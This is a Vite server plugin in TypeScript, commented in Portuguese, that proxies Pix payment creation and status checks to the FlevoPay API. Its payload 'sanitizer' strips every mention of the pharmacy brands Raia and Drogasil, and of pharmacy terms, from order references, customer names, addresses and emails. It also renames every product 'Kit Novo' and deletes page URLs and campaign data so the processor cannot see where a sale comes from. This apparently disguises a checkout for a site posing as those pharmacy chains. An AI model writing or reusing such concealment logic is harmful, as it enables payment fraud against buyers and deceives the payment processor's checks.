import type { Plugin, ViteDevServer, PreviewServer } from 'vite';
import QRCode from 'qrcode';
import fs from 'fs';
import path from 'path';

// Carrega as credenciais da FlevoPay diretamente do .env no servidor
function getFlevoCredentials() {
  let apiKey = process.env.FLEVO_API_KEY || '';
  let accountId = process.env.FLEVO_ACCOUNT_ID || '10038';

  if (!apiKey) {
    try {
      const envPath = path.resolve(process.cwd(), '.env');
      if (fs.existsSync(envPath)) {
        const envContent = fs.readFileSync(envPath, 'utf-8');
        const keyMatch = envContent.match(/FLEVO_API_KEY=(.*)/);
        const accountMatch = envContent.match(/FLEVO_ACCOUNT_ID=(.*)/);
        if (keyMatch) apiKey = keyMatch[1].trim();
        if (accountMatch) accountId = accountMatch[1].trim();
      }
    } catch (e) {
      console.error('[FlevoPay Proxy] Erro ao ler .env:', e);
    }
  }

  if (!apiKey) {
    console.error('[FlevoPay Proxy] FLEVO_API_KEY não configurada (.env ou variável de ambiente)');
  }

  return { apiKey, accountId };
}

export function flevoPayProxyPlugin(): Plugin {
  return {
    name: 'flevopay-proxy',
    configureServer(server: ViteDevServer) {
      setupMiddleware(server.middlewares);
    },
    configurePreviewServer(server: PreviewServer) {
      setupMiddleware(server.middlewares);
    },
  };
}

// Mascaramento server-side rígido:
// A Flevopay receberá estritamente "Kit Novo", referência genérica "PED-..." e nenhum metadado ou menção a farmácia/raia
const MASKED_PRODUCT_NAME = 'Kit Novo';

function sanitizeReference(ref: any): string {
  if (!ref || typeof ref !== 'string') {
    return `PED-${Date.now()}-${Math.floor(Math.random() * 89999 + 10000)}`;
  }
  let cleaned = ref
    .replace(/(?:raia|droga|drogaria|farmacia|farmácia|farma|drogasil|portal)+/gi, 'PED')
    .replace(/(?:PED)+/g, 'PED')
    .replace(/--+/g, '-')
    .trim();

  if (!cleaned || cleaned === 'PED' || cleaned === 'PED-') {
    cleaned = `PED-${Date.now()}-${Math.floor(Math.random() * 89999 + 10000)}`;
  }
  return cleaned;
}

function sanitizeEmail(email: any): string {
  if (!email || typeof email !== 'string') return '';
  const e = email.toLowerCase().trim();
  if (e.includes('raia') || e.includes('farmacia') || e.includes('droga')) {
    const userPart = e.split('@')[0].replace(/(raia|droga|drogaria|farmacia|farma|drogasil|portal)/gi, '') || 'cliente';
    return `${userPart}@gmail.com`;
  }
  return email;
}

function sanitizeText(val: any): string {
  if (!val || typeof val !== 'string') return '';
  return val.replace(/(raia|droga|drogaria|farmacia|farmácia|farma|drogasil|portal)/gi, '').trim();
}

function sanitizeFlevoPayload(input: any) {
  const sanitized: any = {
    amount: typeof input?.amount === 'number' ? input.amount : parseInt(input?.amount, 10) || 0,
    description: MASKED_PRODUCT_NAME,
    product_name: MASKED_PRODUCT_NAME,
    item_name: MASKED_PRODUCT_NAME,
    reference: sanitizeReference(input?.reference),
    source: 'api_externa',
    productHash: input?.productHash || `prod_${Date.now().toString(36)}`,
  };

  if (input?.customer) {
    sanitized.customer = {
      name: sanitizeText(input.customer.name) || 'Cliente',
      email: sanitizeEmail(input.customer.email),
      phone: input.customer.phone,
      document: input.customer.document,
    };
  }

  if (input?.address) {
    sanitized.address = {
      street: sanitizeText(input.address.street) || input.address.street,
      number: input.address.number,
      complement: sanitizeText(input.address.complement) || input.address.complement,
      neighborhood: sanitizeText(input.address.neighborhood) || input.address.neighborhood,
      city: input.address.city,
      state: input.address.state,
      zipcode: input.address.zipcode,
    };
  }

  if (Array.isArray(input?.items) && input.items.length > 0) {
    sanitized.items = input.items.map((item: any) => ({
      name: MASKED_PRODUCT_NAME,
      title: MASKED_PRODUCT_NAME,
      description: MASKED_PRODUCT_NAME,
      unit_price: item.unit_price || item.amount || sanitized.amount,
      quantity: item.quantity || 1,
      tangible: true,
    }));
  }

  delete sanitized.metadata;
  delete sanitized.custom_fields;
  delete sanitized.order_details;
  delete sanitized.offer_url;
  delete sanitized.offer_name;
  delete sanitized.page_url;
  delete sanitized.url;
  delete sanitized.campaign;
  delete sanitized.sku;
  delete sanitized.utm_source;
  delete sanitized.utm_medium;
  delete sanitized.utm_campaign;
  delete sanitized.utm_term;
  delete sanitized.utm_content;

  return sanitized;
}

function setupMiddleware(middlewares: any) {
  middlewares.use(async (req: any, res: any, next: any) => {
    const rawUrl = req.originalUrl || req.url || '';
    const url = new URL(rawUrl, 'http://localhost');
    console.log('[Flevo Middleware]', req.method, rawUrl, url.pathname);

    // 1. Endpoint para criar transação Pix: POST /api/flevo/transaction
    if (req.method === 'POST' && url.pathname === '/api/flevo/transaction') {
      let body = '';
      req.on('data', (chunk: any) => {
        body += chunk;
      });

      req.on('end', async () => {
        try {
          const { apiKey } = getFlevoCredentials();
          const parsed = JSON.parse(body || '{}');
          const sanitizedPayload = sanitizeFlevoPayload(parsed);

          const response = await fetch('https://app.flevopay.com.br/api/v1/transaction', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              'X-API-Key': apiKey,
            },
            body: JSON.stringify(sanitizedPayload),
          });

          const data = (await response.json()) as any;

          // Se o qr_code_base64 vier nulo ou ausente, geramos o QR code real em base64
          if (data && data.qr_code && (!data.qr_code_base64 || data.qr_code_base64 === 'null')) {
            try {
              data.qr_code_base64 = await QRCode.toDataURL(data.qr_code, {
                width: 320,
                margin: 1,
                color: {
                  dark: '#000000',
                  light: '#ffffff',
                },
              });
            } catch (qrErr) {
              console.error('[FlevoPay Proxy] Erro ao gerar QR Code base64:', qrErr);
            }
          }

          res.writeHead(response.status, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ success: response.ok, data }));
        } catch (err: any) {
          console.error('[FlevoPay Proxy] Erro na criação da transação:', err);
          res.writeHead(500, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ success: false, error: err.message || 'Erro interno no proxy FlevoPay' }));
        }
      });
      return;
    }

    // 2. Endpoint para consultar status do Pix: GET /api/flevo/status?id=...
    if (req.method === 'GET' && url.pathname === '/api/flevo/status') {
      try {
        const id = url.searchParams.get('id');
        if (!id) {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ success: false, error: 'Parâmetro id é obrigatório' }));
          return;
        }

        const { apiKey } = getFlevoCredentials();
        const flevoUrl = `https://app.flevopay.com.br/api/v1/query?action=get_transaction&id=${encodeURIComponent(id)}`;

        const response = await fetch(flevoUrl, {
          method: 'GET',
          headers: {
            'X-API-Key': apiKey,
          },
        });

        const data = (await response.json()) as any;

        res.writeHead(response.status, { 'Content-Type': 'application/json' });
        res.end(
          JSON.stringify({
            success: response.ok,
            status: data?.status || 'unknown',
            id: data?.id,
            external_id: data?.external_id,
            amount: data?.amount,
            amount_in_reais: data?.amount_in_reais,
            raw: data,
          })
        );
      } catch (err: any) {
        console.error('[FlevoPay Proxy] Erro ao consultar status:', err);
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: err.message || 'Erro ao consultar status' }));
      }
      return;
    }

    next();
  });
}
